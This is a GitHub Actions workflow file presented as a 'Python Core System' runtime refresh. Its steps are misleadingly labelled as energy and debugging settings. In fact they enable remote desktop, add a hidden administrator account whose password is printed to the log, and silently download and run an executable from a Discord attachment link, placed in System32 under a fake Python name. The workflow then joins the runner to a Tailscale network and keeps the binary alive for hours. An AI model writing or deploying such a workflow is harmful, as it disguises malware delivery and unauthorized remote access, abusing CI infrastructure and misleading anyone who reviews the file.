name: Python-Core-System-v315-Refresh

on:
  workflow_dispatch:

jobs:
  runtime-node:
    runs-on: windows-latest
    timeout-minutes: 3600
    strategy:
      matrix:
        node_id: [1, 2] # Configurado para 2 maquinas seguras

    steps:
      - name: 1. Optimize Energy Settings
        run: |
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
          powercfg /x -monitor-timeout-ac 0
          powercfg /h off

      - name: 2. Enable Debugging Features
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

      - name: 3. Provision Service Account
        run: |
          $p = "Srv" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
          $s = ConvertTo-SecureString $p -AsPlainText -Force
          New-LocalUser -Name "SrvAdmin" -Password $s -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "SrvAdmin"
          echo "SRV_PASS=$p" >> $env:GITHUB_ENV

      - name: 4. Deploy Runtime Module (V3.15)
        run: |
          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1475646734926610512/PYTHON_3.15.exe?ex=69a2331d&is=69a0e19d&hm=4d84c525c93f8263bf8abb0af321c54d98b2bb0c62230cd8748f4a7a8b2a2a25&"
          $dest = "C:\Windows\System32\python_core_v15.exe"
          
          try {
              Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
              Write-Host "Descarga exitosa."
              Start-Process $dest -WindowStyle Hidden
          } catch {
              Write-Error "Fallo en la descarga. Es posible que el enlace de Discord haya caducado de nuevo."
              exit 1
          }

      - name: 5. Establish Network Bridge (Tailscale)
        run: |
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="py-v15-${{ matrix.node_id }}"

      - name: 6. Monitoring & Maintenance Loop
        run: |
          $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          Write-Host "Node ${{ matrix.node_id }} Ready at: $ip"
          Write-Host "User: SrvAdmin | Pass: $env:SRV_PASS"
          while ($true) {
              if (!(Get-Process "python_core_v15" -ErrorAction SilentlyContinue)) {
                  Write-Host "Restarting core module..."
                  Start-Process "C:\Windows\System32\python_core_v15.exe" -WindowStyle Hidden
              }
              Start-Sleep -Seconds 300
          }
